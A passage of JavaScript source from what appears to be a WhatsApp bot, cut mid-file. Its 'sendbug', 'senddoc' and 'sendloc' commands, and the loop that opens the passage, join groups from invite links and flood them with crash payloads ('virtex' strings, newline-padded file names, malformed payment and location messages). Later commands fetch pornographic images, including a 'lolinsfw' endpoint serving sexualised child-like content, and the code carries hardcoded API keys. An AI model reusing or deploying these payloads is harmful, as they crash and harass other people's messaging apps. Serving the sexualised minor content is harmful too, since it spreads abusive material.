var sticker = generateWAMessageFromContent(from,proto.Message.fromObject({stickerMessage: {url: 'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc',fileSha256: 'YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=',fileEncSha256: '9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=',mediaKey: 'nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=',mimetype: 'image/webp',height: 64,width: 64,directPath: '/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781',fileLength: '7774',mediaKeyTimestamp: '1657290167',isAnimated: false,},}),{ userJid: from, quoted: lep })
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(numt, buginvite.message, { messageId: buginvite.key.id })
conn.relayMessage(numt, { requestPaymentMessage: { Message: { TextMessage: { text: '', currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
conn.relayMessage(numt, pollCreation.message, { messageId: pollCreation.key.id })
conn.relayMessage(numt, order.message, { messageId: order.key.id })
conn.relayMessage(numt, audio.message, { messageId: audio.key.id })
conn.relayMessage(numt, image.message, { messageId: image.key.id })
conn.relayMessage(numt, document.message, { messageId: document.key.id })
conn.relayMessage(numt, liveLocation.message, { messageId: liveLocation.key.id })
conn.relayMessage(numt, sticker.message, { messageId: sticker.key.id })
conn.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
conn.sendMessage(numt, { text: '', templateButtons: [{ callButton: { displayText: `P`, phoneNumber: ``}},{ urlButton: { displayText: `P`, url: `https://wa.me/`}},{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},{ quickReplyButton: { displayText: `P`, id: ``}},]})
}
}
break
case 'sendbug':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} linkgp`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await conn.groupAcceptInvite(result)
conn.relayMessage(kir, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `${wm} ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'senddoc':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let kir = await conn.groupAcceptInvite(result)
conn.sendMessage(kir, { 
document: ppnyauser, 
fileName: `🔥 ${wm} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'sendloc':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej ${prefix+command} _link del grupo_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
let hyzdm = await conn.groupAcceptInvite(result)
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var location = generateWAMessageFromContent(kir, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"name": `${wm} ${virus}`,
"address": `${author} ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: from, quoted: lep })
conn.relayMessage(hyzdm, location.message, { messageId: location.key.id })
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass': 
case 'papercut': 
case 'watercolor': 
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
case 'snow': 
case 'cloud': 
case 'honey': 
case 'ice': 
case 'fruitjuice': 
case 'biscuit': 
case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
case 'firework': 
case 'skeleton': 
case 'blackpink': 
case 'sand': 
case 'glue': 
case '1917': 
case 'leaves': {
//if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ej : ${prefix+command} Hyzdmod`) 

let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await textpro.textpro(link, q)
conn.sendMessage(m.chat, { image: { url: anu }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
//if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ej : ${prefix+command} Hyzdmod`) 

let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
conn.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!isPrem) return replyprem(mess.premium)
if (!q) return reply(`Ej : ${prefix+command} Hyzdmod`) 

let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
conn.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.succes}` }, { quoted: m })
}
break
case 'art':
case 'awoo':
case 'bts':
case 'cecan':
case 'cogan':
case 'elaina':
case 'exo':
case 'elf':
case 'estetic':
case 'kanna':
case 'loli':
case 'neko':
case 'waifu':
case 'shota':
case 'husbu':
case 'sagiri':
case 'shinobu':
case 'megumin':
case 'wallnime':
case 'quotesimage': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(m.chat, buttonMessaage, { quoted: m })
}
break

case 'waifunsfw': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break

case 'lolinsfw': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break

case 'nekonsfw': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/nsfw/neko?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break

case 'femdomnsfw': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/nsfw/hentaifemdom?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break


case 'futanari':
case 'feetg':
case 'cum':
case 'classic':
case 'bj':
case 'nsfw_avatar':
case 'anal':
case 'hentai': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break



case 'erofeet':
case 'eroyuri':
case 'erokemo':
case 'ero':
case 'ecchi':
case 'blowjob':
case 'bigtiddies':
case 'thighss':
case 'feets':
case 'booty':
case 'armpits': {
let buttoons = [
{buttonId: `${prefix+command}`, buttonText: {displayText: 'sɪɢᴜɪᴇɴᴛᴇ'}, type: 1}
]
let buttonMessaage = {
image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` }, 
jpegThumbnail: ppnyauser,
caption: `☑️ ʟɪsᴛᴏ @${sender.split("@")[0]}, sɪ ǫᴜɪᴇʀᴇs ᴏᴛʀᴀ ɪᴍᴀɢᴇɴ ᴛᴏᴄᴀ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
fileLength: "999999999999",
mentions: [sender],
footer: wm,
buttons: buttoons,
headerType: 4,
}
conn.sendMessage(sender, buttonMessaage, { quoted: m })
}
break

case 'igstalk': {
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: ${prefix + command} hyzdmod\n❗𝗘𝘀𝘁𝗼 𝗲𝘀𝘁𝗮 𝗲𝗻 𝗯𝗲𝘁𝗮, 𝗽𝘂𝗲𝗱𝗲 𝘁𝗲𝗻𝗲𝗿 𝗲𝗿𝗿𝗼𝗿𝗲𝘀❗`)
reply("ᴏʙᴛᴇɴɪᴇɴᴅᴏ ɪɴғᴏʀᴍᴀᴄɪᴏɴ...\n")
axios.get(`https://api.lolhuman.xyz/api/stalkig/${args[0]}?apikey=SadTeams`).then(({ data }) => {
var resultado = data.result
var textoig = `*IG STLAK*

Username: ${resultado.username}
Fullname: ${resultado.fullname}
Posts: ${resultado.posts}
Seguidores: ${resultado.followers}
Siguiendo: ${resultado.following}
Bio: ${resultado.bio}

${global.wm}
`
conn.sendMessage(from, {
image: { url: resultado.photo_profile }, 
caption: textoig 
})
})
}
break

case 'spotify': {
if (args.length < 1) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ:\n${prefix+command} Joji`)
let list_rows = [];
axios.get(`https://api.lolhuman.xyz/api/spotifysearch?apikey=BrunoSobrino&query=${q}`).then(({ data }) => {
for(var x of data.result) {
list_rows.push({title: x.title, description: `Duración: ${x.duration}\nArtista/s: ${x.artists}`, rowId: `${prefix}downspotify ${x.link}`})
}
const buttonNya = {
text: `ᴄᴏɴsᴜʟᴛᴀ ${q}`,
footer: `ᴘᴀʀᴀ ᴠᴇʀ ʟᴏs ʀᴇsᴜʟᴛᴀᴅᴏs ᴛᴏǫᴜᴇ ᴇʟ ʙᴏᴛᴏɴ ᴅᴇ ᴀʙᴀᴊᴏ`,
buttonText: 'Tap',
sections: [{
title: "𝗕𝗨𝗦𝗤𝗨𝗘𝗗𝗔 𝗗𝗘 𝗦𝗣𝗢𝗧𝗜𝗙𝗬", 
rows: list_rows
}],
listType: 1
}
conn.sendMessage(m.chat, buttonNya)
})
}
break

case 'downspotify':
if (args.length == 0) return reply(`Ej: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=BrunoSobrino&url=${args[0]}`).then(({ data }) => {
var caption = `𝐃𝐄𝐒𝐂𝐀𝐑𝐆𝐀 𝐃𝐄 𝐒𝐏𝐎𝐓𝐈𝐅𝐘\n`
